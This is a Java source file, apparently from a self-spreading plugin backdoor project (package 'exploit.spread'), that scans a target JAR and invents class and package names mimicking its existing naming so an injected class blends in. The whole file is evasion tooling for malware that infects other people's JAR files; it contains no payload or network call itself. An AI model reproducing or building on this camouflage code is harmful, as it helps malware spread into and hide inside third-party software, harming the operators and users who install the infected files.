package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.function.Function;
import java.util.logging.Level;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public final class CamouflageUtils {
    public record CamouflagePlan(String packageName, String className) {}
    private static final Random RANDOM = new Random();
    private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");
    private static final Pattern STRUCTURAL_SPLIT_PATTERN = Pattern.compile("^([A-Z][a-z]+(?:[A-Z][a-z]+)*)([0-9].*)$");
    private static final Pattern OBFUSCATION_PATTERN = Pattern.compile("^([a-zA-Z0-9]+)_([a-zA-Z0-9]+)$");
    private static final List<String> COMMON_SUFFIXES = Arrays.asList("Task", "Worker", "Service", "Manager", "Provider", "Handler", "Util", "Core");

    public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
        Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
        if (packageStructure.isEmpty()) { 
            return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask"); 
        }

        List<Map.Entry<String, List<String>>> packagesSorted = packageStructure.entrySet().stream()
            .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
            .sorted(Comparator.comparingInt(e -> -e.getValue().size()))
            .collect(Collectors.toList());

        if (packagesSorted.isEmpty()) { 
            return new CamouflagePlan("com/tmquan2508/internal/fallback", "Task"); 
        }

        Map.Entry<String, List<String>> chosenEntry = packagesSorted.get(RANDOM.nextInt(Math.min(5, packagesSorted.size())));
        String chosenPackagePath = chosenEntry.getKey();
        List<String> simpleNames = chosenEntry.getValue().stream()
            .map(s -> s.substring(0, s.lastIndexOf('.')))
            .collect(Collectors.toList());
            
        Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Selected package for camouflage: " + chosenPackagePath);

        String obfuscatedName = tryObfuscationPatternStrategy(simpleNames);
        if (obfuscatedName != null) { 
            Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Obfuscation Pattern strategy succeeded.");
            return new CamouflagePlan(chosenPackagePath, obfuscatedName);
        }
        String structuralName = tryStructuralPatternStrategy(simpleNames);
        if (structuralName != null) {
            Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Structural Pattern strategy succeeded.");
            return new CamouflagePlan(chosenPackagePath, structuralName);
        }
        String contextualName = tryContextualChainStrategy(simpleNames);
        if (contextualName != null) {
            Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Contextual Chaining strategy succeeded.");
            return new CamouflagePlan(chosenPackagePath, contextualName);
        }

        Exploit.sender.sendDebug(Level.WARNING, "[Camouflage] Advanced strategies failed. Using robust dictionary fallback.");
        List<String> dictionary = buildWordDictionaryFrom(simpleNames);
        if (dictionary.isEmpty()) {
            String fallbackName = simpleNames.isEmpty() ? "Fallback" : simpleNames.get(0);
            return new CamouflagePlan(chosenPackagePath, findUniqueNameWithSuffixOrNumber(fallbackName, simpleNames));
        }
        String fallbackName = buildUniqueWordName(dictionary, simpleNames, 1, 2);

        return new CamouflagePlan(chosenPackagePath, fallbackName);
    }
    
    private static String tryObfuscationPatternStrategy(List<String> simpleNames) {
        Map<String, Long> baseCounts = simpleNames.stream()
            .map(OBFUSCATION_PATTERN::matcher)
            .filter(Matcher::matches)
            .map(matcher -> matcher.group(1))
            .collect(Collectors.groupingBy(Function.identity(), Collectors.counting()));

        if (baseCounts.isEmpty()) return null;

        Optional<Map.Entry<String, Long>> dominantEntry = baseCounts.entrySet().stream()
            .max(Map.Entry.comparingByValue());
        
        if (dominantEntry.isPresent()) {
            String dominantBase = dominantEntry.get().getKey();
            long count = dominantEntry.get().getValue();
            if ((double) count / simpleNames.size() > 0.7) {
                Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Found a strong obfuscation pattern with base '" + dominantBase + "'.");
                for (int i = 0; i < 200; i++) {
                    String randomSuffix = RANDOM.ints(2, 'a', 'z' + 1)
                        .mapToObj(c -> String.valueOf((char) c))
                        .collect(Collectors.joining());
                    String newName = dominantBase + "_" + randomSuffix;
                    if (!simpleNames.contains(newName)) return newName;
                }
            }
        }
        return null;
    }
    
    private static String tryStructuralPatternStrategy(List<String> simpleNames) {
        Map<String, Set<String>> structuralPatterns = new HashMap<>();
        for (String name : simpleNames) {
            Matcher matcher = STRUCTURAL_SPLIT_PATTERN.matcher(name);
            if (matcher.matches()) { 
                structuralPatterns.computeIfAbsent(matcher.group(1), k -> new HashSet<>()).add(matcher.group(2)); 
            }
        }
        List<Map.Entry<String, Set<String>>> dominantBases = structuralPatterns.entrySet().stream()
            .filter(e -> e.getValue().size() >= 2)
            .collect(Collectors.toList());

        long coveredClasses = dominantBases.stream().mapToLong(e -> e.getValue().size() + 1).sum();
        if (!dominantBases.isEmpty() && ((double) coveredClasses / simpleNames.size()) > 0.6) {
            Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Found a strong structural pattern.");
            for (int i = 0; i < 200; i++) {
                Map.Entry<String, Set<String>> entry = dominantBases.get(RANDOM.nextInt(dominantBases.size()));
                List<String> suffixes = new ArrayList<>(entry.getValue());
                String newName = entry.getKey() + suffixes.get(RANDOM.nextInt(suffixes.size()));
                if (!simpleNames.contains(newName)) return newName;
            }
        }
        return null;
    }

    private static String tryContextualChainStrategy(List<String> simpleNames) {
        Map<String, List<String>> contextMap = new HashMap<>();
        Set<String> startWords = new HashSet<>();
        List<List<String>> namePartsList = simpleNames.stream()
            .map(name -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(name)).filter(s -> !s.isEmpty()).collect(Collectors.toList()))
            .collect(Collectors.toList());

        for (List<String> parts : namePartsList) {
            if (!parts.isEmpty()) {
                startWords.add(parts.get(0));
                for (int i = 0; i < parts.size() - 1; i++) { 
                    contextMap.computeIfAbsent(parts.get(i), k -> new ArrayList<>()).add(parts.get(i + 1)); 
                }
            }
        }
        if (startWords.isEmpty()) return null;

        double avgWordCount = namePartsList.stream().mapToInt(List::size).average().orElse(2.0);
        int minWords = Math.max(1, (int) Math.floor(avgWordCount - 1));
        int maxWords = (int) Math.ceil(avgWordCount) + 1;
        for (int i = 0; i < 100; i++) {
            int wordCount = minWords + (maxWords > minWords ? RANDOM.nextInt(maxWords - minWords + 1) : 0);
            List<String> nameChain = new ArrayList<>();
            List<String> startWordsList = new ArrayList<>(startWords);
            String currentWord = startWordsList.get(RANDOM.nextInt(startWordsList.size()));
            nameChain.add(currentWord);
            while (nameChain.size() < wordCount) {
                List<String> nextWords = contextMap.get(currentWord);
                if (nextWords == null || nextWords.isEmpty()) break;
                currentWord = nextWords.get(RANDOM.nextInt(nextWords.size()));
                nameChain.add(currentWord);
            }
            StringBuilder nameBuilder = new StringBuilder();
            for (String word : nameChain) { 
                nameBuilder.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1)); 
            }
            String newName = nameBuilder.toString();
            if (!newName.isEmpty() && !simpleNames.contains(newName)) return newName;
        }

        Exploit.sender.sendDebug(Level.INFO, "[Camouflage] -> Contextual chain generation failed, trying suffix fallback...");
        if (!startWords.isEmpty()) {
            List<String> startWordsList = new ArrayList<>(startWords);
            String baseName = startWordsList.get(RANDOM.nextInt(startWordsList.size()));
            return findUniqueNameWithSuffixOrNumber(baseName, simpleNames);
        }
        return null;
    }

    private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
        for (int attempts = 0; attempts < 200; attempts++) {
            int wordCount = minWords + (maxWords > minWords ? RANDOM.nextInt(maxWords - minWords + 1) : 0);
            StringBuilder nameBuilder = new StringBuilder();
            String lastWord = null;
            for (int i = 0; i < wordCount; i++) {
                String word;
                int wordAttempt = 0;
                do {
                    word = dictionary.get(RANDOM.nextInt(dictionary.size()));
                    wordAttempt++;
                } while (Objects.equals(word, lastWord) && dictionary.size() > 1 && wordAttempt < 10);
                
                if (!word.isEmpty()) { 
                    nameBuilder.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1)); 
                }
                lastWord = word;
            }
            String newName = nameBuilder.toString();
            if (!newName.isEmpty() && !existingNames.contains(newName)) return newName;
        }
        return findUniqueNameWithSuffixOrNumber(dictionary.get(RANDOM.nextInt(dictionary.size())), existingNames);
    }

    private static String findUniqueNameWithSuffixOrNumber(String baseName, List<String> existingNames) {
        List<String> suffixes = new ArrayList<>(COMMON_SUFFIXES);
        Collections.shuffle(suffixes);
        for (String suffix : suffixes) {
            String newName = baseName + suffix;
            if (!existingNames.contains(newName)) return newName;
        }

        for (int i = 1; i <= 100; i++) {
            String newName = baseName + i;
            if (!existingNames.contains(newName)) return newName;
        }
        
        return baseName + (101 + RANDOM.nextInt(899));
    }

    private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
        Map<String, List<String>> packageMap = new HashMap<>();
        try (ZipFile zipFile = new ZipFile(jarFile)) {
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();
                String entryName = entry.getName();
                if (entry.isDirectory() || 
                    !entryName.endsWith(".class") || 
                    entryName.contains("$") || 
                    entryName.endsWith("package-info.class") || 
                    entryName.equals("module-info.class")) {
                    continue;
                }
                int lastSlash = entryName.lastIndexOf('/');
                String packageName = (lastSlash == -1) ? "" : entryName.substring(0, lastSlash);
                packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(entryName.substring(lastSlash + 1));
            }
        } catch (IOException e) { 
            Exploit.sender.sendDebug(Level.WARNING, "[Camouflage] Error scanning JAR file: " + e.getMessage()); 
        }
        return packageMap;
    }

    private static List<String> buildWordDictionaryFrom(List<String> classNames) { 
        return classNames.stream()
            .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
            .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
            .filter(word -> word.length() > 2)
            .distinct()
            .collect(Collectors.toList()); 
    }
}